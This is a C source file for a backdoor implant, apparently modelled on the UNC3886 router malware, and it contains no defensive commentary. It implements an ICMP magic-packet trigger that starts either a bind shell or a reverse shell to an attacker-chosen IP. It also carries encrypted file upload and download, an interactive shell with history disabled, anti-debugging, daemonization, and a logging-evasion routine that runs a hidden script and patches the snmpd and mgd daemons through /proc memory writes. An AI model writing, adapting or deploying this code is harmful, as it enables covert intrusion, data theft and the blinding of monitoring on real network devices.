    if (memcmp(packet + padded_len, computed_hmac, 20) != 0) {
        free(packet);
        return 0;
    }
    
    session->recv_counter++;
    
    /* Decrypt remaining blocks */
    memcpy(iv_copy, session->recv_iv, AES_BLOCK_SIZE);
    for (size_t i = 0; i < padded_len; i += 16) {
        uint8_t temp[16];
        memcpy(temp, packet + i, 16);
        aes_decrypt_block(&session->aes_ctx, packet + i);
        for (int j = 0; j < 16; j++) {
            packet[i + j] ^= iv_copy[j];
        }
        memcpy(iv_copy, temp, 16);
    }
    
    memcpy(data, packet + 2, data_len);
    *len = data_len;
    
    free(packet);
    return 1;
}

/* ============================================================================
 * AUTHENTICATION PROTOCOL
 * ============================================================================ */

static int perform_auth_handshake(int sockfd, struct session_context *session,
                                   const uint8_t *auth_key) {
    uint8_t client_challenge[20];
    uint8_t server_challenge[20];
    uint8_t response[32];
    size_t resp_len;
    
    /* Generate and send client challenge */
    struct sha1_context sha_ctx;
    struct timeval tv;
    pid_t pid = getpid();
    
    gettimeofday(&tv, NULL);
    sha1_init(&sha_ctx);
    sha1_update(&sha_ctx, (uint8_t *)&tv, sizeof(tv));
    sha1_update(&sha_ctx, (uint8_t *)&pid, sizeof(pid));
    sha1_final(&sha_ctx, client_challenge);
    
    pid++;
    gettimeofday(&tv, NULL);
    sha1_init(&sha_ctx);
    sha1_update(&sha_ctx, (uint8_t *)&tv, sizeof(tv));
    sha1_update(&sha_ctx, (uint8_t *)&pid, sizeof(pid));
    sha1_final(&sha_ctx, server_challenge);
    
    /* Send both challenges */
    uint8_t challenge_packet[40];
    memcpy(challenge_packet, client_challenge, 20);
    memcpy(challenge_packet + 20, server_challenge, 20);
    
    if (!send_all(sockfd, challenge_packet, 40, 0)) {
        return 0;
    }
    
    /* Derive session keys */
    derive_session_keys(session, auth_key, server_challenge);
    
    /* Receive and verify server response */
    if (!recv_encrypted_packet(sockfd, session, response, &resp_len)) {
        return 0;
    }
    
    if (resp_len == 16 && memcmp(response, client_challenge, 16) == 0) {
        return 1;
    }
    
    return 0;
}

static int authenticate_connection(int sockfd, struct session_context *session,
                                    const uint8_t *auth_key) {
    uint8_t challenges[40];
    uint8_t server_nonce[20];
    uint8_t client_nonce[20];
    uint8_t response[16];
    size_t resp_len;
    
    /* Receive server challenges */
    if (!recv_all(sockfd, challenges, 40, 0)) {
        return 0;
    }
    
    memcpy(server_nonce, challenges, 20);
    memcpy(client_nonce, challenges + 20, 20);
    
    /* Derive session keys */
    derive_session_keys(session, auth_key, client_nonce);
    
    /* Send response */
    if (!send_encrypted_packet(sockfd, session, server_nonce, 16)) {
        return 0;
    }
    
    return 1;
}

/* ============================================================================
 * FILE TRANSFER COMMANDS
 * ============================================================================ */

static int handle_file_download(int sockfd, struct session_context *session) {
    uint8_t path_buffer[MAX_PACKET_SIZE];
    uint8_t data_buffer[MAX_PACKET_SIZE];
    size_t path_len;
    
    if (!recv_encrypted_packet(sockfd, session, path_buffer, &path_len)) {
        return -1;
    }
    
    /* Check for end-of-session marker */
    if (path_len == 1 && path_buffer[0] == 0x06) {
        return 1;
    }
    
    path_buffer[path_len] = '\0';
    
    int fd = open((char *)path_buffer, 0);
    if (fd < 0) {
        return -1;
    }
    
    ssize_t bytes_read;
    while ((bytes_read = read(fd, data_buffer, MAX_PACKET_SIZE)) > 0) {
        if (!send_encrypted_packet(sockfd, session, data_buffer, bytes_read)) {
            close(fd);
            return -1;
        }
    }
    
    close(fd);
    return 0;
}

static int handle_file_upload(int sockfd, struct session_context *session) {
    uint8_t path_buffer[MAX_PACKET_SIZE];
    uint8_t data_buffer[MAX_PACKET_SIZE];
    size_t path_len;
    
    if (!recv_encrypted_packet(sockfd, session, path_buffer, &path_len)) {
        return -1;
    }
    
    if (path_len == 1 && path_buffer[0] == 0x06) {
        return -1;
    }
    
    path_buffer[path_len] = '\0';
    
    int fd = creat((char *)path_buffer, 0644);
    if (fd < 0) {
        return -1;
    }
    
    size_t data_len;
    while (recv_encrypted_packet(sockfd, session, data_buffer, &data_len)) {
        if (memcmp(data_buffer, MAGIC_ACK, 16) == 0) {
            close(fd);
            return 0;
        }
        write(fd, data_buffer, data_len);
    }
    
    close(fd);
    return -1;
}

/* ============================================================================
 * INTERACTIVE SHELL (PTY MULTIPLEXER)
 * ============================================================================ */

static int execute_interactive_shell(int sockfd, struct session_context *session) {
    int pty_master, pty_slave;
    char *tty_name;
    char *shell_cmd;
    char term_env[256];
    struct winsize win_size;
    uint8_t buffer[MAX_PACKET_SIZE];
    size_t data_len;
    fd_set read_fds;
    int max_fd;
    
    if (openpty(&pty_master, &pty_slave, NULL, NULL, NULL) < 0) {
        return -1;
    }
    
    tty_name = ttyname(pty_slave);
    if (tty_name == NULL) {
        return -1;
    }
    
    /* Disable history logging */
    putenv("HISTFILE=");
    
    /* Receive terminal type */
    if (!recv_encrypted_packet(sockfd, session, buffer, &data_len)) {
        return -1;
    }
    buffer[data_len] = '\0';
    setenv("TERM", (char *)buffer, 1);
    
    /* Receive window size */
    if (!recv_encrypted_packet(sockfd, session, buffer, &data_len) || data_len != 4) {
        return -1;
    }
    
    win_size.ws_col = ((uint16_t)buffer[0] << 8) | buffer[1];
    win_size.ws_row = ((uint16_t)buffer[2] << 8) | buffer[3];
    win_size.ws_xpixel = 0;
    win_size.ws_ypixel = 0;
    
    ioctl(pty_master, TIOCSWINSZ, &win_size);
    
    /* Receive shell command */
    if (!recv_encrypted_packet(sockfd, session, buffer, &data_len)) {
        return -1;
    }
    
    if (data_len == 1 && buffer[0] == 3) {
        shell_cmd = strdup("csh");
    } else {
        buffer[data_len] = '\0';
        shell_cmd = strdup((char *)buffer);
    }
    
    pid_t child_pid = fork();
    if (child_pid < 0) {
        free(shell_cmd);
        return -1;
    }
    
    if (child_pid == 0) {
        /* Child process - execute shell */
        close(sockfd);
        close(pty_master);
        
        if (setsid() < 0) {
            free(shell_cmd);
            exit(-1);
        }
        
        if (ioctl(pty_slave, TIOCSCTTY, 0) < 0) {
            free(shell_cmd);
            exit(-1);
        }
        
        dup2(pty_slave, STDIN_FILENO);
        dup2(pty_slave, STDOUT_FILENO);
        dup2(pty_slave, STDERR_FILENO);
        
        if (pty_slave > 2) {
            close(pty_slave);
        }
        
        execl("/bin/csh", "csh", "-c", shell_cmd, NULL);
        
        free(shell_cmd);
        exit(0);
    }
    
    /* Parent process - multiplex I/O */
    close(pty_slave);
    free(shell_cmd);
    
    max_fd = (sockfd > pty_master) ? sockfd : pty_master;
    
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(sockfd, &read_fds);
        FD_SET(pty_master, &read_fds);
        
        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            return -1;
        }
        
        /* Data from network */
        if (FD_ISSET(sockfd, &read_fds)) {
            if (!recv_encrypted_packet(sockfd, session, buffer, &data_len)) {
                return -1;
            }
            if (write(pty_master, buffer, data_len) != (ssize_t)data_len) {
                return -1;
            }
        }
        
        /* Data from PTY */
        if (FD_ISSET(pty_master, &read_fds)) {
            ssize_t bytes = read(pty_master, buffer, MAX_PACKET_SIZE);
            if (bytes <= 0) {
                return 0;
            }
            if (!send_encrypted_packet(sockfd, session, buffer, bytes)) {
                return -1;
            }
        }
    }
    
    return 0;
}

/* ============================================================================
 * PASSIVE LISTENER (BIND SHELL)
 * ============================================================================ */

void start_passive_listener(void) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len;
    pid_t child_pid;
    int optval = 1;
    struct session_context session;
    uint8_t cmd_buffer[MAX_PACKET_SIZE];
    size_t cmd_len;
    
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        exit(3);
    }
    
    if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        exit(4);
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons_convert(PASSIVE_LISTEN_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        exit(5);
    }
    
    if (listen(server_sock, 5) < 0) {
        exit(6);
    }
    
    while (1) {
        client_len = sizeof(client_addr);
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_len);
        
        if (client_sock < 0) {
            exit(7);
        }
        
        child_pid = fork();
        if (child_pid > 0) {
            waitpid(child_pid, NULL, 0);
            close(client_sock);
            continue;
        } else if (child_pid < 0) {
            close(client_sock);
            continue;
        }
        
        /* Child process */
        close(server_sock);
        
        /* Double fork for daemon independence */
        child_pid = fork();
        if (child_pid < 0) exit(8);
        if (child_pid > 0) exit(9);
        
        /* Authentication with timeout */
        alarm(AUTH_TIMEOUT_SEC);
        if (!authenticate_connection(client_sock, &session, (const uint8_t *)AUTH_IDENTIFIER)) {
            shutdown(client_sock, SHUT_RDWR);
            exit(10);
        }
        alarm(0);
        
        /* Receive command ID */
        if (!recv_encrypted_packet(client_sock, &session, cmd_buffer, &cmd_len) || cmd_len != 1) {
            shutdown(client_sock, SHUT_RDWR);
            exit(11);
        }
        
        int status = 0;
        switch (cmd_buffer[0]) {
            case CMD_DOWNLOAD_FILE:
                status = handle_file_download(client_sock, &session);
                break;
            case CMD_UPLOAD_FILE:
                status = handle_file_upload(client_sock, &session);
                break;
            case CMD_INTERACTIVE_SHELL:
                status = execute_interactive_shell(client_sock, &session);
                break;
            default:
                status = 12;
                break;
        }
        
        shutdown(client_sock, SHUT_RDWR);
        exit(status);
    }
}

/* ============================================================================
 * ACTIVE STRATCOM_PERSISTENCE (REVERSE SHELL)
 * ============================================================================ */

void start_active_STRATCOM_PERSISTENCE(const char *target_ip, uint16_t target_port) {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *host;
    struct session_context session;
    uint8_t cmd_buffer[MAX_PACKET_SIZE];
    size_t cmd_len;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return;
    }
    
    /* Bind to specific interface if available */
    if (g_bound_interface_index != -1) {
        setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &g_bound_interface_index, sizeof(int));
        int buf_size = 16;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(int));
    }
    
    host = gethostbyname(target_ip);
    if (host == NULL) {
        close(sockfd);
        return;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons_convert(target_port);
    bcopy(host->h_addr_list[0], (char *)&server_addr.sin_addr, host->h_length);
    
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return;
    }
    
    /* Authentication with timeout */
    alarm(AUTH_TIMEOUT_SEC);
    if (!authenticate_connection(sockfd, &session, (const uint8_t *)AUTH_IDENTIFIER)) {
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        return;
    }
    alarm(0);
    
    /* Command loop */
    while (1) {
        if (!recv_encrypted_packet(sockfd, &session, cmd_buffer, &cmd_len)) {
            break;
        }
        
        if (cmd_len == 16 && memcmp(cmd_buffer, MAGIC_ACK, 16) == 0) {
            break;
        }
        
        switch (cmd_buffer[0]) {
            case CMD_DOWNLOAD_FILE:
                if (handle_file_download(sockfd, &session) != 0) {
                    send_encrypted_packet(sockfd, &session, MAGIC_ACK, 16);
                }
                break;
            case CMD_UPLOAD_FILE:
                handle_file_upload(sockfd, &session);
                send_encrypted_packet(sockfd, &session, MAGIC_ACK, 16);
                break;
            case CMD_INTERACTIVE_SHELL:
                execute_interactive_shell(sockfd, &session);
                send_encrypted_packet(sockfd, &session, MAGIC_ACK, 16);
                break;
            case CMD_EXIT_SESSION:
                if (recv_encrypted_packet(sockfd, &session, cmd_buffer, &cmd_len)) {
                    if (cmd_buffer[0] != 0x05) {
                        cmd_buffer[cmd_len] = '\0';
                        /* Process exit code if needed */
                    }
                }
                break;
            case CMD_PORT_FORWARD:
                /* handle_port_forward(sockfd, &session); */
                send_encrypted_packet(sockfd, &session, MAGIC_ACK, 16);
                break;
            default:
                break;
        }
    }
    
    shutdown(sockfd, SHUT_RDWR);
    close(sockfd);
}

/* ============================================================================
 * ICMP SNIFFER (MAGIC PACKET DETECTOR)
 * ============================================================================ */

void irad_pcap_sniffer(const char *interface_name) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap_handle;
    struct bpf_program bpf_prog;
    bpf_u_int32 net_ip, net_mask;
    struct pcap_pkthdr *pkthdr;
    const u_char *packet;
    char magic_payload[16];
    char target_ip[24];
    char port_buffer[6];
    
    /* BPF filter for UNC3886 magic packet signature */
    const char *bpf_filter = "icmp[4:2] == 0xaa56";
    
    if (pcap_lookupnet(interface_name, &net_ip, &net_mask, errbuf) != 0) {
        exit(0);
    }
    
    pcap_handle = pcap_open_live(interface_name, 98, 0, 1, errbuf);
    if (pcap_handle == NULL) {
        exit(0);
    }
    
    if (pcap_compile(pcap_handle, &bpf_prog, bpf_filter, 0, net_mask) != 0) {
        exit(0);
    }
    
    if (pcap_setfilter(pcap_handle, &bpf_prog) != 0) {
        exit(0);
    }
    
    while (1) {
        do {
            packet = pcap_next(pcap_handle, pkthdr);
        } while (packet == NULL);
        
        if (pkthdr->caplen < 35) continue;
        
        /* Parse Ethernet + IP headers */
        const struct ipv4_header *ip_hdr = (struct ipv4_header *)(packet + 14);
        int ip_header_len = (ip_hdr->version_ihl & 0x0F) * 4;
        
        const struct icmp_malicious_header *icmp_hdr = 
            (struct icmp_malicious_header *)((const u_char *)ip_hdr + ip_header_len);
        
        /* Only process ICMP Echo Request */
        if (icmp_hdr->type != 8) continue;
        
        /* Extract and decrypt magic payload */
        memcpy(magic_payload, icmp_hdr->magic_payload, 16);
        xor_buffer_string(magic_payload, XOR_CIPHER_KEY);
        
        char trigger_mode = (icmp_hdr->trigger_mode ^ XOR_CIPHER_KEY) - '0';
        
        /* Check for activation command */
        if (memcmp(magic_payload, MAGIC_ACTIVATE, 16) == 0) {
            
            if (trigger_mode == 1 || trigger_mode == 2) {
                /* Active STRATCOM_PERSISTENCE mode */
                uint8_t ip_bytes[4];
                ip_bytes[0] = icmp_hdr->target_ip_raw[0] ^ XOR_CIPHER_KEY;
                ip_bytes[1] = icmp_hdr->target_ip_raw[1] ^ XOR_CIPHER_KEY;
                ip_bytes[2] = icmp_hdr->target_ip_raw[2] ^ XOR_CIPHER_KEY;
                ip_bytes[3] = icmp_hdr->target_ip_raw[3] ^ XOR_CIPHER_KEY;
                
                sprintf(target_ip, "%d.%d.%d.%d", ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);
                
                /* Extract port */
                for (int i = 0; i < 5; i++) {
                    port_buffer[i] = icmp_hdr->target_port_raw[i];
                    if (port_buffer[i] == ' ') {
                        port_buffer[i] = '\0';
                        break;
                    }
                }
                xor_buffer_string(port_buffer, XOR_CIPHER_KEY);
                int target_port = atoi(port_buffer);
                
                if (target_port > 0 && strlen(target_ip) > 6 && trigger_mode == 1) {
                    pid_t child = fork();
                    if (child == 0) {
                        start_active_STRATCOM_PERSISTENCE(target_ip, (uint16_t)target_port);
                        exit(0);
                    }
                }
            } else if (trigger_mode == 0 && g_is_passive_running == 0) {
                /* Passive listener mode */
                g_passive_listener_pid = fork();
                g_is_passive_running = 1;
                
                if (g_passive_listener_pid == 0) {
                    start_passive_listener();
                    exit(0);
                }
            }
        }
        /* Check for kill switch command */
        else if (g_is_passive_running && memcmp(magic_payload, MAGIC_KILL, 16) == 0 && trigger_mode == 0) {
            g_is_passive_running = 0;
            kill(g_passive_listener_pid, SIGKILL);
        }
    }
}

/* ============================================================================
 * DAEMON ENTRY POINT
 * ============================================================================ */

static int daemon_entry(int argc, char **argv) {
    char *interface_env;
    char interface_name[64];
    
    interface_env = getenv("eth");
    if (interface_env == NULL) {
        exit(0);
    }
    
    memset(interface_name, 0, sizeof(interface_name));
    strncpy(interface_name, interface_env, sizeof(interface_name) - 1);
    
    /* Anti-debugging: exit if argv[1] is "Info" */
    if (argc == 2 && argv[1] != NULL) {
        if (strncmp(argv[1], "Info", 4) == 0) {
            exit(0);
        }
    }
    
    /* Ignore common termination signals */
    signal(SIGUSR1, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGUSR2, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    /* First fork */
    pid_t pid = fork();
    if (pid < 0) {
        return 1;
    }
    
    if (pid > 0) {
        return 0;
    }
    
    /* Create new session */
    if (setsid() < 0) {
        return 2;
    }
    
    /* Second fork */
    pid = fork();
    if (pid > 0) {
        exit(0);
    }
    if (pid < 0) {
        return -1;
    }
    
    /* Close all file descriptors */
    for (int i = 0; i < 1024; i++) {
        close(i);
    }
    
    chdir("/");
    umask(0);
    
    signal(SIGCHLD, SIG_IGN);
    
    /* Start the ICMP sniffer */
    irad_pcap_sniffer(interface_name);
    
    return 0;
}

/* ============================================================================
 * LOGGING EVASION MODULE (LMPAD)
 * ============================================================================ */

#define SNMPD_TRAP_CONFIGS_ADDR 0x8601328
#define SNMPD_DISABLE_VAL       0x00000000
#define MGD_PROLOGUE_ADDR       0x84E90D8
#define MGD_ORIGINAL_PROLOGUE   0x57858955
#define MGD_PATCHED_PROLOGUE    0xC3D08990

static void execute_pre_ssh_script(void) {
    const char *script = 
        "gzip -d /var/tmp/pfed_jdhcp6_trace.log -c > /var/tmp/pfed_jdhcp6_trace.log.bak;"
        "sh /var/tmp/pfed_jdhcp6_trace.log.bak pre;"
        "rm -rf /var/tmp/pfed_jdhcp6_trace.log /var/tmp/pfed_jdhcp6_trace.log.bak;"
        "kill -9 $$";
    
    system(script);
}

static int get_daemon_pid(const char *pid_file) {
    FILE *fp = fopen(pid_file, "r");
    if (!fp) return -1;
    
    int pid = -1;
    fscanf(fp, "%d", &pid);
    fclose(fp);
    return pid;
}

static void patch_process_memory(int pid, uint32_t address, uint32_t value) {
    char cmd[512];
    
    FILE *temp = fopen("/var/tmp/rts", "wb");
    if (temp) {
        fwrite(&value, sizeof(uint32_t), 1, temp);
        fclose(temp);
    }
    
    snprintf(cmd, sizeof(cmd),
             "dd of=/proc/%d/mem if=/var/tmp/rts bs=1 count=4 oseek=%u conv=notrunc 2>/dev/null",
             pid, address);
    
    system(cmd);
    unlink("/var/tmp/rts");
}

void lmpad_disable_logging(void) {
    execute_pre_ssh_script();
    
    int snmpd_pid = get_daemon_pid("/var/run/snmpd.pid");
    if (snmpd_pid > 0) {
        patch_process_memory(snmpd_pid, SNMPD_TRAP_CONFIGS_ADDR, SNMPD_DISABLE_VAL);
    }
    
    int mgd_pid = get_daemon_pid("/var/run/mgd.pid");
    if (mgd_pid > 0) {
        patch_process_memory(mgd_pid, MGD_PROLOGUE_ADDR, MGD_PATCHED_PROLOGUE);
    }
}

/* ============================================================================
 * MAIN ENTRY POINT
 * ============================================================================ */

int main(int argc, char **argv) {
    return daemon_entry(argc, argv);
}
